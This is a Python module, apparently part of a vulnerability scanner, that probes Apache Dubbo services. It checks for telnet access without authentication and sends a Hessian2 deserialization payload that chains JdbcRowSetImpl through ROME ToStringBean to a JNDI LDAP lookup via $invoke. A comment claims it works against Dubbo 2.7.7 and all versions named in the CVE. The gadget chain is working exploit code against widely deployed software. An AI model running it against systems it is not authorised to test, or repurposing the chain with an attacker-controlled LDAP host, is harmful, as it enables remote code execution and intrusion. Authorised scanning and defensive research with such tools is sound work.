# coding=utf-8
from async_timeout import timeout
from colorama import Fore
from tqdm import tqdm
import asyncio
from dubbo.codec.hessian2 import Decoder, new_object
from dubbo.client import DubboClient

# https://www.cnblogs.com/wh4am1/p/12307848.html
async def checkUnauth(addr):
    try:
        with timeout(5):
            reader, writer = await asyncio.open_connection(addr.split(':')[0], int(addr.split(':')[1]))
            writer.write(b'ls\r\n')
            data = str(await reader.read(1024))
            if 'com.alibaba.dubbo' in data and ("token=false" in data or "token=true" not in data):
                tqdm.write(Fore.RED + '[+] Target maybe support dobbo unauth, {}'.format(addr))
                return {'name': 'unauth', 'url': addr, 'software': 'dubbo'}
    except Exception:
        pass
    finally:
        try:
            writer.close()
            # await writer.wait_closed()
        except NameError:
            pass


# dubbo deserlize, not async func
async def checkDeserialization(addr):
    try:
        client = DubboClient(addr.split(':')[0], int(addr.split(':')[1]))

        JdbcRowSetImpl = new_object(
            'com.sun.rowset.JdbcRowSetImpl',
            dataSource='ldap://1.1.1.1',
            strMatchColumns=["foo"]
        )
        JdbcRowSetImplClass = new_object(
            'java.lang.Class',
            name="com.sun.rowset.JdbcRowSetImpl",
        )
        toStringBean = new_object(
            'com.rometools.rome.feed.impl.ToStringBean',
            beanClass=JdbcRowSetImplClass,
            obj=JdbcRowSetImpl
        )

        resp = client.send_request_and_return_response(
            service_name='org.apache.dubbo.spring.boot.sample.consumer.DemoService',
            # 此处可以是 $invoke、$invokeSync、$echo 等，通杀 2.7.7 及 CVE 公布的所有版本。
            method_name='$invoke',
            args=[toStringBean])
        result = str(resp)
        if 'Fail to decode request due to: RpcInvocation' in result:
            tqdm.write(Fore.RED + '[+] Target maybe not support deserialization, {}'.format(addr))
            return {'name': 'maybe deserialization', 'url': addr, 'software': 'dubbo'}
        elif 'EXCEPTION: Could not complete class com.sun.rowset.JdbcRowSetImpl.toString()' in result:
            tqdm.write(Fore.RED + '[+] Target support deserialization, {}'.format(addr))
            return {'name': 'deserialization', 'url': addr, 'software': 'dubbo'}
        else:
            tqdm.write(Fore.RED + '[+] Target maybe support deserialization, {}'.format(addr))
            return {'name': 'maybe deserialization', 'url': addr, 'software': 'dubbo'}
    except Exception:
        pass
    # finally:
        # try:
        #     client.close()
        # except NameError:
        #     pass


async def dubboScan(addr, pbar):
    vulList = []

    a = await checkUnauth(addr)
    b = await checkDeserialization(addr)

    if a is not None:
        vulList.append(a)
    if b is not None:
        vulList.append(b)
    # b = await checkWeakPass(addr)
    pbar.update(1)
    return vulList
